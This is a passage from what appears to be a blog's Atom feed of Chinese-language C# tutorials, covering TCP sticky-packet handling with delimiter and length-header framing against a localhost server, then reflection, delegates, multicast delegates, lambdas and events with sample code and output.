class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">TcpClientDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        TcpClient client = <span class="keyword">new</span> TcpClient(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5000</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Connected to server.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        NetworkStream stream = client.GetStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟粘包场景：连续发送多个小数据包</span></span><br><span class="line">        <span class="built_in">string</span>[] messages = &#123; <span class="string">&quot;Message1&quot;</span>, <span class="string">&quot;Message2&quot;</span>, <span class="string">&quot;Message3&quot;</span> &#125;;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> message <span class="keyword">in</span> messages)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> data = message + <span class="string">&quot;|&quot;</span>;</span><br><span class="line">            <span class="built_in">byte</span>[] buffer = Encoding.UTF8.GetBytes(data);</span><br><span class="line">            stream.Write(buffer, <span class="number">0</span>, buffer.Length);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Sent: <span class="subst">&#123;message&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stream.Close();</span><br><span class="line">        client.Close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码中的粘包场景<br><strong>客户端</strong><br>模拟粘包通过连续发送数据包（Message1|Message2|Message3|），未等待服务端处理后再发送下一个包。</p><p><strong>服务端</strong><br>接收数据时，数据可能一次性接收到多个数据包，也可能接收到不完整的数据包。通过使用分隔符 | 拆分数据，可以解决粘包问题。</p><p>扩展：更高效的分包方式（包头+包体）<br>数据格式<br>包头：4 字节，表示包体长度。<br>包体：实际数据内容。</p><h1 id="处理粘包问题"><a href="#处理粘包问题" class="headerlink" title="处理粘包问题"></a>处理粘包问题</h1><p>服务端</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> headerSize = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">byte</span>[] headerBuffer = <span class="keyword">new</span> <span class="built_in">byte</span>[headerSize];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取包头</span></span><br><span class="line">    <span class="built_in">int</span> headerBytes = clientSocket.Receive(headerBuffer);</span><br><span class="line">    <span class="keyword">if</span> (headerBytes &lt; headerSize) <span class="keyword">break</span>; <span class="comment">// 连接断开</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> bodyLength = BitConverter.ToInt32(headerBuffer, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">byte</span>[] bodyBuffer = <span class="keyword">new</span> <span class="built_in">byte</span>[bodyLength];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取包体</span></span><br><span class="line">    <span class="built_in">int</span> bodyBytes = clientSocket.Receive(bodyBuffer);</span><br><span class="line">    <span class="built_in">string</span> message = Encoding.UTF8.GetString(bodyBuffer, <span class="number">0</span>, bodyBytes);</span><br><span class="line"></span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Received Message: <span class="subst">&#123;message&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码（包头 + 包体）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">TcpClientDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        TcpClient client = <span class="keyword">new</span> TcpClient(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5000</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Connected to server.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        NetworkStream stream = client.GetStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟发送多条消息</span></span><br><span class="line">        <span class="built_in">string</span>[] messages = &#123; <span class="string">&quot;Hello, Server!&quot;</span>, <span class="string">&quot;This is a test.&quot;</span>, <span class="string">&quot;Goodbye!&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> message <span class="keyword">in</span> messages)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 将消息转为字节数组</span></span><br><span class="line">            <span class="built_in">byte</span>[] bodyBuffer = Encoding.UTF8.GetBytes(message);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 包头：消息长度（4 字节整数）</span></span><br><span class="line">            <span class="built_in">byte</span>[] headerBuffer = BitConverter.GetBytes(bodyBuffer.Length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 组合包头和包体</span></span><br><span class="line">            <span class="built_in">byte</span>[] packet = <span class="keyword">new</span> <span class="built_in">byte</span>[headerBuffer.Length + bodyBuffer.Length];</span><br><span class="line">            Buffer.BlockCopy(headerBuffer, <span class="number">0</span>, packet, <span class="number">0</span>, headerBuffer.Length);</span><br><span class="line">            Buffer.BlockCopy(bodyBuffer, <span class="number">0</span>, packet, headerBuffer.Length, bodyBuffer.Length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送数据包</span></span><br><span class="line">            stream.Write(packet, <span class="number">0</span>, packet.Length);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Sent: <span class="subst">&#123;message&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stream.Close();</span><br><span class="line">        client.Close();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Disconnected from server.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>包头</strong><br>使用 BitConverter.GetBytes(int) 将包体长度转换为 4 字节的字节数组。<br>这样，服务端可以根据包头解析出包体的长度，确保不会漏读或多读数据。</p><p><strong>包体</strong><br>实际的消息内容（字符串）被编码为字节数组 bodyBuffer。</p><p>组合包头和包体<br>使用 Buffer.BlockCopy 将包头和包体拼接成一个完整的数据包，按照以下格式发送：</p><p>[包头 (4字节)][包体 (N字节)]<br><strong>发送逻辑</strong><br>调用 stream.Write 将整个数据包发送到服务端。即使多次发送，服务端依然能够正确解析每个数据包的内容。</p><p><strong>运行结果</strong><br>假设服务端按照之前的代码实现分包逻辑（先读包头，再根据长度读包体），运行客户端和服务端后，输出类似以下结果：</p><p>服务端输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Server started, waiting <span class="keyword">for</span> connection...</span><br><span class="line">Client connected!</span><br><span class="line">Received Message: Hello, Server!</span><br><span class="line">Received Message: This is a <span class="built_in">test</span>.</span><br><span class="line">Received Message: Goodbye!</span><br></pre></td></tr></table></figure><p>客户端输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connected to server.</span><br><span class="line">Sent: Hello, Server!</span><br><span class="line">Sent: This is a <span class="built_in">test</span>.</span><br><span class="line">Sent: Goodbye!</span><br><span class="line">Disconnected from server.</span><br></pre></td></tr></table></figure><p>这种方式可以避免使用分隔符（如 |）时可能产生的冲突问题，常用于传输二进制数据和更复杂的协议通信。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;：&lt;/p&gt;
&lt;h1 id=&quot;模拟粘包的场景&quot;&gt;&lt;a href=&quot;#模拟粘包的场景&quot; class=&quot;headerlink&quot; title=&quot;模拟粘包的场景&quot;&gt;&lt;/a&gt;模拟粘包的场景&lt;/h1&gt;&lt;p&gt;粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>csharp reflection delegate</title>
    <link href="https://banjinmei.github.io/2024/11/24/csharp-reflection-delegate/"/>
    <id>https://banjinmei.github.io/2024/11/24/csharp-reflection-delegate/</id>
    <published>2024-11-24T09:36:50.000Z</published>
    <updated>2024-12-11T13:25:06.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>反射<br>动态加载和创建对象：<br>反射可以在运行时加载程序集，并基于类型信息创建对象实例，而无需在编译时知道具体的类型。<br>这对于实现插件系统、动态加载模块或在不同版本的库之间提供兼容性非常有用。</p><p>反射可以获取有关类型（如类、接口、结构体等）及其成员（如字段、属性、方法等）的详细信息。<br>这对于生成文档、进行代码分析或创建序列化&#x2F;反序列化机制等任务非常有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Program</span><br><span class="line">  &#123;</span><br><span class="line">      static void Main(string[] args)</span><br><span class="line">      &#123;</span><br><span class="line">          // 加载包含类型的程序集</span><br><span class="line">          Assembly assembly = Assembly.LoadFrom(<span class="string">&quot;ReflectionExample.dll&quot;</span>);</span><br><span class="line"> </span><br><span class="line">          // 获取类型信息</span><br><span class="line">          Type <span class="built_in">type</span> = assembly.GetType(<span class="string">&quot;ReflectionExample.MyClass&quot;</span>);</span><br><span class="line"> </span><br><span class="line">          // 创建对象实例</span><br><span class="line">          object instance = Activator.CreateInstance(<span class="built_in">type</span>);</span><br><span class="line"> </span><br><span class="line">          // 获取方法信息</span><br><span class="line">          MethodInfo methodInfo = type.GetMethod(<span class="string">&quot;MyMethod&quot;</span>);</span><br><span class="line"> </span><br><span class="line">          // 调用方法</span><br><span class="line">          methodInfo.Invoke(instance, new object[] &#123; <span class="string">&quot;Hello, Reflection!&quot;</span> &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  public class MyClass</span><br><span class="line">  &#123;</span><br><span class="line">      public void MyMethod(string message)</span><br><span class="line">      &#123;</span><br><span class="line">          Console.WriteLine(message);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="Delegate"><a href="#Delegate" class="headerlink" title="Delegate"></a>Delegate</h1><p><strong>委托</strong><br>委托是一种类型安全的函数指针，可以用来引用一个或多个具有相同签名的方法。<br>委托（Delegate）是一种特殊的类型，它代表对具有特定参数列表和返回类型的函数的引用。委托可以用来封装静态方法或实例方法，并且可以在运行时像普通变量一样传递。这使得委托成为一种强大的工具，用于实现回调函数、事件处理以及其他需要函数作为参数传递的场景。</p><p><strong>委托的基本特性</strong><br>类型安全：委托是类型安全的，因为它们在声明时会指定一个方法签名，只有与这个签名匹配的方法才能被委托引用。<br>多播能力：大多数委托支持多播，即一个委托实例可以引用多个方法。当调用该委托时，所有引用的方法都会被依次调用。<br>灵活性：委托可以用来引用类的实例方法或静态方法，也可以引用匿名方法（使用lambda表达式）。<br>定义委托<br>委托可以通过delegate关键字定义。定义时需要指定返回类型和参数列表。<br>有访问修饰符，delegate，返回值类型，委托名称，参数-可选。可以在类内部，可以在外部。</p><p><strong>本质</strong><br>底层是个特殊类(强类型)， 继承运行时的MulticastDelegate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public delegate void MyDelegate(string message); // 返回类型为void，接受一个字符串参数</span><br></pre></td></tr></table></figure><p>使用委托<br>创建委托实例<br> 可以通过委托的构造函数或者new关键字创建委托实例，并将它绑定到具体的方法上。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">MyMethod</span>(<span class="params"><span class="built_in">string</span> message</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StaticMethod</span>(<span class="params"><span class="built_in">string</span> message</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Static: &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyClass instance = <span class="keyword">new</span> MyClass();</span><br><span class="line">        MyDelegate del1 = <span class="keyword">new</span> MyDelegate(instance.MyMethod);</span><br><span class="line">        MyDelegate del2 = <span class="keyword">new</span> MyDelegate(StaticMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用委托</span></span><br><span class="line">        del1(<span class="string">&quot;Hello from instance method&quot;</span>);</span><br><span class="line">        del2(<span class="string">&quot;Hello from static method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多播委托<br>如果 定义的委托不是void返回类型，那么当委托指向多个方法时，只有最后一个方法的返回值会被返回。对于返回类型为void的委托，所有方法都会被执行。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span>(<span class="params"><span class="built_in">string</span> message</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Method1: &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span>(<span class="params"><span class="built_in">string</span> message</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Method2: &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate del1 = <span class="keyword">new</span> MyDelegate(Method1);</span><br><span class="line">        MyDelegate del2 = <span class="keyword">new</span> MyDelegate(Method2);</span><br><span class="line">        MyDelegate combined = del1 + del2; <span class="comment">// 组合两个委托</span></span><br><span class="line"></span><br><span class="line">        combined(<span class="string">&quot;Hello multi-cast delegate&quot;</span>); <span class="comment">// 调用组合后的委托</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Lambda表达式<br>从C# 3.0开始， 可以使用lambda表达式来创建委托，这使得代码更加简洁。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate del = message =&gt; Console.WriteLine(<span class="string">&quot;Lambda: &quot;</span> + message);</span><br><span class="line">        del(<span class="string">&quot;Hello lambda expression&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参数传递委托"><a href="#参数传递委托" class="headerlink" title="参数传递委托"></a>参数传递委托</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1T1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">NoReOutClass</span>()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyDele</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">NoReP</span>()</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">NoRePn</span>(<span class="params"><span class="built_in">int</span> x, <span class="built_in">int</span> y</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="built_in">int</span> <span class="title">WithReP</span>()</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="built_in">int</span> <span class="title">WithRePn</span>(<span class="params"><span class="built_in">int</span> x,<span class="keyword">ref</span>  <span class="built_in">int</span> y</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//NoReP mh1 = new NoReP(DoNothing);</span></span><br><span class="line">            NoReP methodhander1 = DoNothing;<span class="comment">//语法糖</span></span><br><span class="line">            <span class="comment">//methodhander1.Invoke();//执行委托 //old dotnet ver BeginInvoke</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//本质是类的实例  可以做为参数传递 </span></span><br><span class="line">            ExDele(methodhander1);<span class="comment">//类似容器 把一段函数-业务逻辑 传递到不同的地方</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span>/使用 </span></span><br><span class="line">            <span class="comment">//    MyDele myDele = new MyDele();</span></span><br><span class="line">            <span class="comment">//    myDele.show();</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExDele</span>(<span class="params">NoReP de</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            de.Invoke();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoNothing</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;do nothing&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoObj</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;do obj&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>事件是基于订阅-发布模式的一种机制，用于实现对象之间的解耦。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Publisher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">event</span> EventHandler CustomEvent;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnCustomEvent</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        CustomEvent?.Invoke(<span class="keyword">this</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TriggerEvent</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        OnCustomEvent(EventArgs.Empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Subscriber</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnCustomEvent</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Event received.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Publisher publisher = <span class="keyword">new</span> Publisher();</span><br><span class="line">        Subscriber subscriber = <span class="keyword">new</span> Subscriber();</span><br><span class="line"></span><br><span class="line">        publisher.CustomEvent += subscriber.OnCustomEvent;</span><br><span class="line">        publisher.TriggerEvent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 .NET 中，事件是一种特殊的委托类型（委托的一个变量），用于实现发布-订阅模式。事件允许一个对象（发布者）通知其他对象（订阅者）发生了某些事情。下面是一个简单的 .NET 事件的例子，我们将创建一个简单的计数器类 Counter，当计数达到特定值时触发事件。</p><p>定义事件<br>首先，我们需要定义一个事件处理器委托，然后在 Counter 类中声明一个事件。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个事件处理程序委托</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">ReachedEventHandler</span>(<span class="params"><span class="built_in">object</span> source, EventArgs e</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计数器类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Counter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 定义一个事件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">event</span> ReachedEventHandler Reached;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> _count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加计数的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Increment</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        _count++;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;Count is now <span class="subst">&#123;_count&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当计数达到某个值时触发事件</span></span><br><span class="line">        <span class="keyword">if</span> (_count &gt;= <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            OnReached();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 